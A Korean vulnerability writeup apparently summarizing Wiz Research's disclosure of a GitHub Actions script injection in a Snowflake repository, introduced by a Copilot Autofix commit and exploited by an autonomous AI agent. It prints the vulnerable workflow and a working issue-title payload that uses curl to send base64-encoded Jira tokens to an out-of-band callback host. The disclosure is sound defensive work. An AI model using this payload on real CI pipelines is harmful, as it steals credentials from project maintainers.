15:T2dde,<p>Snowflake는 HackerOne을 통한 취약점 공개 프로그램을 운영하며 지속적으로 보안 연구자들의 검증을 받고 있습니다. 이번에는 Wiz Research가 자체 개발한 자율 AI 보안 리서치 도구 &quot;Red Agent&quot;가 Snowflake의 공개 GitHub 저장소에서 심각한 GitHub Actions 워크플로 취약점을 발견했는데요, 흥미로운 지점은 이 취약점 자체가 GitHub Copilot의 &quot;Autofix&quot; 기능이 커밋한 코드에서 비롯됐다는 사실입니다. AI 코딩 에이전트가 만든 코드를 AI 보안 리뷰가 통과시켰고, 이를 또 다른 자율 AI 에이전트가 찾아내 실제로 악용까지 성공시킨 이번 사례는, AI가 코드 작성부터 보안 검토, 취약점 탐지까지 전 과정에 관여하는 새로운 개발 환경에서 어떤 위험이 발생할 수 있는지 잘 보여줍니다.</p>
<h3>사건 개요</h3>
<p>Wiz Red Agent는 <code>snowflakedb/snowflake-connector-net</code> 저장소에서 스크립트 인젝션 취약점을 발견했습니다. 인증되지 않은 사용자가 특별히 조작한 제목으로 GitHub 이슈를 하나 여는 것만으로 GitHub Actions 러너 내에서 임의 명령을 실행할 수 있는 구조였습니다.</p>
<p>더 눈여겨볼 부분은 타이밍입니다. 이 취약점은 발견 불과 5일 전인 2026년 6월 18일, PR #1218이 머지되면서 실제로 살아 있는 상태가 됐습니다. 그리고 이 PR의 최종 스쿼시 커밋에는 &quot;Copilot Autofix powered by AI&quot;가 공동 작성자(co-author)로 기록돼 있었습니다. 해당 PR은 기존에 안전하게 구성돼 있던 입력값 sanitize 패턴을 걷어내고, 직접적인 문자열 확장 방식으로 바꿔버렸는데도 GitHub의 AI 기반 보안 리뷰는 이 변경으로 생긴 치명적 취약점을 전혀 잡아내지 못했습니다.</p>
<h3>취약점 발견 과정</h3>
<p>Wiz Red Agent의 CI/CD 스캐닝 기능이 Snowflake의 GitHub organization을 훑던 중, <code>snowflakedb/snowflake-connector-net</code> 저장소의 <code>jira_issue.yml</code> 워크플로가 <code>run:</code> 블록 안에서 신뢰할 수 없는 입력값을 그대로 사용하고 있어 스크립트 인젝션에 취약하다는 점을 잡아냈습니다.</p>
<p>문제가 된 코드 변경 내역은 다음과 같습니다.</p>
<pre><code>- env:
- ISSUE_TITLE: ${{ github.event.issue.title }}
- run: jq -n --arg title &quot;$ISSUE_TITLE&quot; ...
+ run: TITLE=$(echo '${{ github.event.issue.title }}' | sed ...)</code></pre>
<p>이 워크플로는 <code>issues: opened</code> 이벤트에서 트리거됩니다. 즉 누구든 GitHub 이슈를 하나 열기만 하면 이 워크플로를 실행시킬 수 있다는 뜻입니다. 그리고 공격자가 통제할 수 있는 이슈 제목을 셸 스크립트에 그대로 삽입하고 있었습니다.</p>
<pre><code>run: |
  TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/&quot;/\\&quot;/g' | sed &quot;s/'/\\\'/g&quot;)</code></pre>
<p>여기서 <code>sed</code>를 이용한 이스케이프 처리는 GitHub의 템플릿 확장이 끝난 <em>이후</em>에 실행됩니다. 따라서 이슈 제목에 작은따옴표(<code>'</code>) 하나만 넣어도 <code>echo '...'</code> 구문을 벗어날 수 있고, 곧바로 임의 명령 실행으로 이어집니다.</p>
<p>이 취약한 패턴이 도입된 시점은 불과 며칠 전인 2026년 6월 18일, 커밋 <code>4a1b8ce</code>(PR #1218: &quot;SNOW-2069227: Update jira workflows&quot;)였고, 공동 작성자로 &quot;Copilot Autofix powered by AI&quot;가 기록돼 있었습니다. 이 커밋은 원래 저장소에 있던 안전한 패턴 — 이슈 제목을 <code>env:</code> 변수로 전달한 뒤 <code>jq</code>로 JSON 페이로드를 구성하던 방식 — 을 제거하고, 위에서 본 것처럼 <code>${{ github.event.issue.title }}</code>을 직접 문자열에 끼워 넣는 방식으로 바꿔버렸습니다. 한마디로, AI &quot;autofix&quot; 커밋이 스스로 인젝션 벡터를 만들어낸 셈입니다.</p>
<h3>열려 있던 &quot;보안 게이트&quot;</h3>
<p>해당 워크플로에는 언뜻 보호 장치처럼 보이는 조건문이 있었습니다.</p>
<pre><code>if: (github.event_name == 'issues' &amp;&amp; github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')</code></pre>
<p>하지만 <code>issues</code> 이벤트에서는 <code>github.event.pull_request</code>가 항상 <code>null</code>입니다. 따라서 이 조건은 결국 <code>(null != 'whitesource-for-github-com[bot]')</code>로 귀결되고, 이는 언제나 참(true)입니다. 결과적으로 모든 GitHub 사용자가 이 게이트를 그냥 통과할 수 있었던 것이죠.</p>
<h3>실제 익스플로잇 과정</h3>
<p>Wiz는 템플릿 확장 이후 <code>echo</code> 문자열을 빠져나가 out-of-band 콜백을 통해 Jira 자격증명을 유출시키는 이슈 제목을 만들어 테스트했습니다.</p>
<p>흥미로운 대목은, Red Agent의 cicd 기능이 처음에 표준 주석 문자(<code>#</code>)로 페이로드를 종료하려 했을 때 러너가 bash 문법 오류를 반환했다는 점입니다. 주석 처리 과정에서 <code>TITLE=$(...)</code>의 닫는 괄호까지 함께 먹혀버렸기 때문인데요, Red Agent는 여기서 멈추지 않고:</p>
<ul>
<li>발생한 문법 오류를 자율적으로 분석하고</li>
<li>페이로드를 <code>; echo '</code> 형태로 수정해 셸 블록을 올바르게 닫은 뒤</li>
<li>out-of-band 콜백을 성공적으로 수신했습니다.</li>
</ul>
<pre><code>' ; curl -s &quot;https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&amp;e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&amp;u=`printf %s $JIRA_BASE_URL|base64 -w0`&quot; ; echo '</code></pre>
<p>수 초 만에 Azure IP <code>20.106.182.197</code>의 GitHub Actions 러너로부터 base64로 인코딩된 자격증명이 담긴 콜백이 리스너에 도착했습니다.</p>
<p>&gt; 참고: 첫 시도에서는 <code>#</code>로 나머지 줄을 주석 처리하려 했지만, <code>TITLE=$(...)</code>의 닫는 괄호까지 함께 소모되면서 예기치 않은 EOF bash 오류가 발생했습니다. 해결책은 <code>; echo '</code>를 사용해 셸 문법을 정확히 닫아주는 것이었습니다.</p>
<p>유출된 토큰은 <code>qa@snowflake.net</code> 계정으로 <code>snowflakecomputing.atlassian.net</code>에 인증됐고, Snowflake의 엔지니어링, 보안 컴플라이언스, 버그바운티 트래킹 프로젝트 전반에 대한 읽기 권한을 갖고 있었습니다.</p>

<h3>핵심 시사점</h3>
<p><strong>AI 코드 생성에는 엄격한 감독이 필요합니다.</strong> AI 코딩 도구는 확률적 패턴에 기반해 코드를 예측하기 때문에, 이미 오래전에 폐기된 안전하지 않은 셸 패턴을 의도치 않게 다시 도입할 수 있습니다. AI가 생성한 PR도 사람이 작성한 코드와 동일한 수준의 정적 분석과 보안 검토를 반드시 거쳐야 합니다.</p>
<p><strong>발견 시간이 급격히 짧아지고 있습니다.</strong> 이번 취약점은 살아 있던 기간이 단 5일에 불과했고, 그마저도 자동화된 에이전트가 발견하고 검증하는 데 걸린 시간이었습니다. 보안 운영 체계는 이제 자동화된 취약점 탐색이 몇 시간 단위로 이뤄지는 환경에 맞춰, 빠른 패치 주기와 단기 유효 자격증명 도입 등으로 대응해야 합니다.</p>
<p><strong>AI로 인한 보안 회귀(regression)를 막아야 합니다.</strong> 자동화된 AI 어시스턴트는 특정 코드 패턴이 왜 그렇게 선택됐는지에 대한 맥락을 갖고 있지 않은 경우가 많습니다. 이번 사건에서도 자동화된 PR이 셸 인젝션을 막기 위해 명시적으로 도입해뒀던 안전한 <code>env:</code> + <code>jq</code> 파싱 패턴을 제거해버렸습니다. 보안 팀은 AI 에이전트가 구조화된 데이터 파서를 직접적인 문자열 보간(interpolation)으로 대체하지 못하도록 막는 가드레일을 마련해야 합니다.</p>

<h3>Snowflake의 공식 입장</h3>
<p>Snowflake는 HackerOne 취약점 공개 및 버그바운티 프로그램을 통한 Wiz의 책임 있는 보고와 협력에 감사를 표했습니다. 2026년 6월 23일 접수된 이 신고는 즉시 조사·복구됐으며, 조사 결과 무단 접근의 증거는 발견되지 않았다고 밝혔습니다. Snowflake는 시스템 보호를 최우선 과제로 삼고 있으며, 소프트웨어 개발 및 보안 관행을 지속적으로 강화해 나갈 것이라고 덧붙였습니다. 또한 이번 사례에서 얻은 교훈을 Wiz와 함께 업계 전반에 공유해, 관련 보안 모범 사례의 폭넓은 도입을 촉진하겠다고 밝혔습니다.</p>
<h3>정리</h3>
<ul>
<li>AI 코드 어시스턴트(&quot;Copilot Autofix&quot;)가 작성한 PR이 기존의 안전한 입력 검증 패턴을 제거하고 셸 인젝션에 취약한 코드로 대체했으며, 이는 AI 기반 보안 리뷰조차 걸러내지 못했습니다.</li>
<li>취약점은 병합된 지 단 5일 만에 자율 AI 보안 에이전트(&quot;Red Agent&quot;)에 의해 발견·검증됐고, 에이전트는 최초 익스플로잇 시도가 실패하자 스스로 원인을 분석해 페이로드를 수정하는 자율적 문제 해결 능력을 보였습니다.</li>
<li>얼핏 보호 장치처럼 보이던 워크플로의 <code>if</code> 조건문이 실제로는 항상 참으로 평가되는 논리적 결함을 갖고 있어, 사실상 아무런 인증 없이도 워크플로를 실행할 수 있었습니다.</li>
<li>실무적으로는 (1) AI가 생성한 코드에도 사람이 작성한 코드와 동일한 보안 검토를 적용하고, (2) 자동 발견·악용 속도에 맞춰 패치 주기를 단축하고 단기 유효 자격증명을 도입하며, (3) AI 에이전트가 구조화된 파싱 패턴을 문자열 보간으로 되돌리지 못하도록 가드레일을 두는 세 가지 대응이 필요합니다.</li>
